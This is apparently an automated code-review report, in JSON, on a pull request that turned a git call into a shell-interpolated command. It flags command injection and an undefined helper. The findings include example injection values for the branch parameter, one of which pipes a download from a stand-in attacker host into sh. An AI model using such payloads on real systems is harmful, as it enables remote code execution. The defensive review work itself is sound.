@@ -1,0 +1,33 @@
+{
+  "schemaVersion": 1,
+  "planEntryId": "59e311b06f07462edb15acde",
+  "publication": {
+    "artifact": "canonical",
+    "fallback": false
+  },
+  "findings": [
+    {
+      "title": "[P1] Reintroduce argument-array invocation to prevent shell command injection",
+      "body": "The new code interpolates `branch` directly into a shell command string (`const command = \\`git show ${branch}\\``) and executes it through a shell-running `exec`-style API, whereas the removed code passed `branch` as a single literal argument to `git` with no shell interpretation. Any caller-supplied value containing shell metacharacters — e.g. `main; curl attacker.example/payload | sh` or `topic$(command)` — now executes arbitrary commands with the process's privileges, and can also hang the returned promise with injected long-running children (`HEAD; sleep 300`). `showBranch`'s contract (a free-form `branch: string`) is unchanged, so this bites under realistic inputs. Keep the parameter out of the shell: `return execFileAsync(\"git\", [\"show\", branch]);`",
+      "severity": "P1",
+      "location": {
+        "path": "src/git.ts",
+        "side": "RIGHT",
+        "start": 15,
+        "end": 16
+      }
+    },
+    {
+      "title": "[P1] Replace undefined `execAsync` with a real import/helper",
+      "body": "The added line calls `execAsync(command)`, but no binding named `execAsync` exists in module scope: line 13 imports only `execFile` from `node:child_process` (and `execAsync` is not a Node builtin export), there is no local definition, and a repository-wide search finds no other module that could define it. Every invocation of `showBranch` therefore throws `ReferenceError: execAsync is not defined`, and the file fails to typecheck (TS2304) as the repo stands. If the intent was to switch to shell `exec`, it still needs a real promisified helper; otherwise restore the previous `execFileAsync` call.",
+      "severity": "P1",
+      "location": {
+        "path": "src/git.ts",
+        "side": "RIGHT",
+        "start": 16,
+        "end": 16
+      }
+    }
+  ],
+  "markdown": "# PR Review\n\n**Verdict:** request_changes\n\n## Overview\n\nThis PR \"refines\" `showBranch` in `src/git.ts` by replacing the argument-array invocation `execFileAsync(\"git\", [\"show\", branch])` with a shell command string built via template literal — `` `git show ${branch}` `` — passed to `execAsync`. The exported signature and intended Git operation are unchanged.\n\nThe change is a regression on two counts: it moves an untrusted parameter into a shell-interpreted command string (command injection), and it calls `execAsync`, which does not exist anywhere in the module or repository. Both problems are on the added lines and should be fixed before merge; the simplest fix is to keep the original argument-array form.\n\n## Verification\n\nVerification did not run: no user-level `verificationBaselines` are configured (`pr_review_verify` list returned disabled, zero baselines; project-local profiles are ignored). Disclosure: such baselines execute PR code without a filesystem or network sandbox and lifecycle supervision signals only the original POSIX process group — a deliberate `setsid`/new-session escape can survive cleanup; use an external sandbox or container wrapper for untrusted PRs. Findings below are grounded in direct source inspection of the head tree (`src/git.ts`), the base version (`a0b7b20`), and a repository-wide search.\n\n## Findings\n\n### [P1] Reintroduce argument-array invocation to prevent shell command injection\n**Severity:** P1\n**Rationale:** The new code interpolates `branch` directly into a shell command string (`const command = \\`git show ${branch}\\``) and executes it through a shell-running `exec`-style API, whereas the removed code passed `branch` as a single literal argument to `git` with no shell interpretation. Any caller-supplied value containing shell metacharacters — e.g. `main; curl attacker.example/payload | sh` or `topic$(command)` — now executes arbitrary commands with the process's privileges, and can also hang the returned promise with injected long-running children (`HEAD; sleep 300`). `showBranch`'s contract (a free-form `branch: string`) is unchanged, so this bites under realistic inputs. Keep the parameter out of the shell: `return execFileAsync(\"git\", [\"show\", branch]);`\n**Location:** `src/git.ts:15-16 RIGHT`\n\n### [P1] Replace undefined `execAsync` with a real import/helper\n**Severity:** P1\n**Rationale:** The added line calls `execAsync(command)`, but no binding named `execAsync` exists in module scope: line 13 imports only `execFile` from `node:child_process` (and `execAsync` is not a Node builtin export), there is no local definition, and a repository-wide search finds no other module that could define it. Every invocation of `showBranch` therefore throws `ReferenceError: execAsync is not defined`, and the file fails to typecheck (TS2304) as the repo stands. If the intent was to switch to shell `exec`, it still needs a real promisified helper; otherwise restore the previous `execFileAsync` call.\n**Location:** `src/git.ts:16 RIGHT`\n\n## Lane completeness\nAll requested lanes completed.\n\n## Strengths and notes\n\n- Minimal, localized diff that preserves the public function signature and the intended `git show` operation — easy to fix by reverting to the argument-array call.\n- **Correctness:** broken as written — undefined `execAsync` makes every call throw; shell semantics also change how errors/stdout are produced for branch names containing metacharacters.\n- **Security:** command injection via string-interpolated shell command; treat `branch` as untrusted data, never as executable syntax.\n- **Performance:** beyond the security risk, injected or pathological `branch` values can spawn unbounded shell work under the function's promise; no regression once the argument-array form is restored."
+}
